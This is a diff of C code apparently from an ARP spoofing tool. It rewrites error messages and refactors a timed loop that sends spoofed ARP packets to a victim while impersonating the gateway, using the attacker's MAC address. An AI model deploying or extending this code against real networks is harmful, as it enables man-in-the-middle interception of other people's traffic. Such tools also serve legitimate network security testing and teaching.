@@ -47,8 +47,8 @@ void broadcast_arp_request(
             sizeof(addr_ll)
         )
         == -1) {
-        perror("sendto");
-        fprintf(stderr, "ERROR: Failed to broadcast_arp_request\n");
+        perror("ERROR: broadcast_arp_request, failed to send ether_arp "
+               "request via arp_sock");
         close(arp_sock);
         exit(1);
     }
@@ -74,7 +74,7 @@ int receive_arp_reply(
 
     int ret = select(arp_sock + 1, &socks, NULL, NULL, &timeout);
     if (ret == -1) {
-        perror("select");
+        perror("ERROR: receive_arp_reply, failed to select a socket");
         goto fail;
     } else if (ret == 0) {
         return receive_arp_reply(
@@ -84,7 +84,8 @@ int receive_arp_reply(
 
     int res = recv(arp_sock, rep, sizeof(ether_arp), 0);
     if (res == -1) {
-        perror("recv");
+        perror("ERROR: receive_arp_reply, failed to recv a reply from the "
+               "arp_sock");
         goto fail;
     }
 
@@ -150,36 +151,32 @@ void send_arp_spoof(
             sizeof(addr_ll)
         )
         == -1) {
-        perror("sendto");
-        fprintf(stderr, "ERROR: Failed to send_arp_spoof\n");
+        perror("ERROR: send_arp_spoof, failed to sendto a spoof via the "
+               "arp_sock");
         close(arp_sock);
         exit(1);
     }
 }
 
-void* start_arp_spoof(void* args) {
-    ARPSpoofArgs* arp_spoof_args = (ARPSpoofArgs*)args;
+void* start_arp_spoof(void* arp_spoof_args) {
+    ARPSpoofArgs* args = (ARPSpoofArgs*)arp_spoof_args;
     time_t start_time = 0;
     int elapsed_time;
     do {
         time_t current_time = time(NULL);
         elapsed_time = current_time - start_time;
-        if (elapsed_time >= arp_spoof_args->period_sec) {
-            for (int i = 0; i < arp_spoof_args->n_victims; ++i) {
-                Mac victim_mac = arp_spoof_args->victim_macs[i];
-                u32 victim_addr_hl = arp_spoof_args->victim_addrs_hl[i];
-                send_arp_spoof(
-                    arp_spoof_args->arp_sock,
-                    arp_spoof_args->if_name,
-                    arp_spoof_args->attacker_mac,
-                    arp_spoof_args->gateway_addr_hl,
-                    victim_mac,
-                    victim_addr_hl
-                );
-            }
+        if (elapsed_time >= args->period_sec) {
+            send_arp_spoof(
+                args->arp_sock,
+                args->if_name,
+                args->attacker_mac,
+                args->gateway_addr_hl,
+                args->victim_mac,
+                args->victim_addr_hl
+            );
             start_time = time(NULL);
         }
-    } while (arp_spoof_args->is_terminated == 0);
+    } while (args->is_terminated == 0);
 
     return NULL;
 }
